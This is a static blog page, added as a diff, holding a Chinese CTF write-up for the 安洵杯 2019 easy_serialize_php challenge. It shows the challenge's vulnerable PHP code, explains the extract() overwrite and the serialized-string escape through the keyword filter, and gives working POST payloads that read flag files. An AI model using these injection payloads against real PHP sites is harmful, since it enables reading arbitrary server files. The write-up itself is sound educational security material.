@@ -1,0 +1,424 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-Hans" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>安洵杯 2019 easy_serialize_php - Αιώνιος</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="0x00知识点[安洵杯 2019]easy_seria...">
+  <meta name="author" content="4v1d">
+  <link rel="icon" href="/images/icons/cute.jpg" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/cute.jpg" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/cute.jpg" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/cute.jpg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/cute.jpg">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="https://at.alicdn.com/t/font_1445822_p6ry5n7lrr.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      loading: {
+        gif: '/images/theme/loading.gif',
+        lottie: ''
+      },
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: {
+          gif: '/images/theme/loading.gif',
+          lottie: ''
+        }
+      },
+      donate: {
+        enable: false,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          typing: true,
+          api: 'https://v1.hitokoto.cn/?encode=text&c=d',
+          data_contents: ''
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: 'search.xml'
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Αιώνιος" type="application/atom+xml">
+</head>
+
+<body class="lock-screen">
+  <div class="loading" id="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">安洵杯 2019 easy_serialize_php</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 相册</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/life/%E6%B0%94%E8%B1%A1%E4%BB%AA.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">安洵杯 2019 easy_serialize_php</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>August 19, 2021</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>3527</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        
+        <h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12261610.html">安洵杯 2019]easy_serialize_php - 王叹之 - 博客园 (cnblogs.com)</a></p>
+<p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/h3zh1/p/12732336.html">安洵杯 2019]easy_serialize_php - h3zh1 - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-var_dump-function.html">https://www.runoob.com/php/php-var_dump-function.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp">https://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp</a></p>
+<h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p><img   class="lazyload" data-original="/2021/08/19/2021/ctf/14/image-20210819094121329.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>发现了参数f</p>
+<p>代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>$function &#x3D; @$_GET[&#39;f&#39;];<br><br>function filter($img)&#123;<br>  $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);<br>  $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;<br>  return preg_replace($filter,&#39;&#39;,$img);<br>&#125;<br><br><br>if($_SESSION)&#123;<br>  unset($_SESSION);<br>&#125;<br><br>$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;<br>$_SESSION[&#39;function&#39;] &#x3D; $function;<br><br>extract($_POST);<br><br>if(!$function)&#123;<br>  echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;<br>&#125;<br><br>if(!$_GET[&#39;img_path&#39;])&#123;<br>  $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);<br>&#125;else&#123;<br>  $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));<br>&#125;<br><br>$serialize_info &#x3D; filter(serialize($_SESSION));<br><br>if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;<br>  highlight_file(&#39;index.php&#39;);<br>&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;<br>  eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!<br>&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;<br>  $userinfo &#x3D; unserialize($serialize_info);<br>  echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>正式审计前，我注意到了题目一个很大的提示</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($<span class="hljs-function"><span class="hljs-keyword">function</span> == &#x27;<span class="hljs-title">phpinfo</span>&#x27;)</span>&#123;<br>  <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br></code></pre></td></tr></table></figure>
+
+<p>顺着提示，赋值f=phpinfo进行查询。</p>
+<p><img   class="lazyload" data-original="/2021/08/19/2021/ctf/14/image-20210819094711265.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>找到了d0g3_f1ag.php，猜测flag在其中</p>
+<p>接下来代码审计</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params">$img</span>)</span>&#123;<br>    $filter_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    $filter = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,$filter_arr).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> preg_replace($filter,<span class="hljs-string">&#x27;&#x27;</span>,$img);<br>&#125;<br><br>$serialize_info = filter(serialize($_SESSION));<br></code></pre></td></tr></table></figure>
+
+<p>filter函数是为了过滤用的</p>
+<p>过滤了很多关键字，比如php，flag，若遇到会正则替换为空</p>
+<p>之后还会序列化，所以我们要反序列化操作一手</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>($_SESSION)&#123;<br>    <span class="hljs-keyword">unset</span>($_SESSION);<br>&#125;<br><br>$_SESSION[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>$_SESSION[<span class="hljs-string">&#x27;function&#x27;</span>] = $function;<br><br>extract($_POST);<br></code></pre></td></tr></table></figure>
+
+<p>我萌发现unset函数将$_SESSION销毁了</p>
+<p>然后重新赋予$_SESSION了新的值。</p>
+<p>最后调用了extract($_POST);</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">extract</span><span class="hljs-params">()</span></span> 函数从数组中将变量导入到当前的符号表。<br></code></pre></td></tr></table></figure>
+
+<h5 id="举例extract-变量覆盖"><a href="#举例extract-变量覆盖" class="headerlink" title="举例extract()变量覆盖"></a>举例extract()变量覆盖</h5><p>根据extract()我们可以进行变量覆盖，</p>
+<p>当我们传入SESSION[flag]=123时，$SESSION[“user”]和$SESSION[‘function’] 全部会消失。</p>
+<p>只剩下_SESSION[flag]=123。</p>
+<p><img   class="lazyload" data-original="/2021/08/19/2021/ctf/14/1947190-20200419170914367-953947353.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="img"></p>
+<h6 id="键值逃逸"><a href="#键值逃逸" class="headerlink" title="键值逃逸"></a>键值逃逸</h6><p>原理:因为序列化后的字符串是严格的，对应的格式不能错，比如s:4:”name”,那s:4就必须有一个字符串长度是4的否则就往后截取</p>
+<p>并且unserialize会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号后面的就都被扔掉。</p>
+<p>示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#正规序列化的字符串</span><br>$a = <span class="hljs-string">&quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;&quot;</span>;<br>var_dump(unserialize($a));<br><span class="hljs-comment">#带有多余的字符的字符串</span><br>$a_laji = <span class="hljs-string">&quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;;s:3:\&quot;真的垃圾img\&quot;;lajilaji&quot;</span>;<br>var_dump(unserialize($a_laji));<br></code></pre></td></tr></table></figure>
+
+<p>有了这个逃逸概念的话，就大概可以理解了。</p>
+<p>如果我们把$_SESSION[‘img’] = base64_encode(‘guest_img.png’);这段代码的img属性放到花括号外边去</p>
+<p>然后花括号中注好新的img属性，那么他本来要求的img属性就被咱们替换了。</p>
+<p>payload：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[phpflag]=;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;xxxxxxx&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[phpflag]=;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;phpflagphpflag&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;xxxxxxx&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="/2021/08/19/2021/ctf/14/image-20210819210654326.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210819210654326"></p>
+<p><img   class="lazyload" data-original="/2021/08/19/2021/ctf/14/image-20210819210523566.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210819210523566"></p>
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>4v1d</li>
+    <li><strong>本文链接：</strong><a href="http://daweitech.github.io/2021/08/19/2021/ctf/14/index.html" title="http:&#x2F;&#x2F;daweitech.github.io&#x2F;2021&#x2F;08&#x2F;19&#x2F;2021&#x2F;ctf&#x2F;14&#x2F;index.html">http:&#x2F;&#x2F;daweitech.github.io&#x2F;2021&#x2F;08&#x2F;19&#x2F;2021&#x2F;ctf&#x2F;14&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a href="/2021/08/29/2021/ctf/15/"><i class="iconfont iconleft"></i>HCTF 2018 WarmUp</a>
+    <a href="/2021/08/18/2021/ctf/13/">De1CTF 2019 SSRF Me<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">0x00知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01%E8%A7%A3%E9%A2%98"><span class="toc-text">0x01解题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8Bextract-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-text">举例extract()变量覆盖</span></a></li></ol></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=905095727 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://github.com/zhaoo "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:izhaoo@163.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
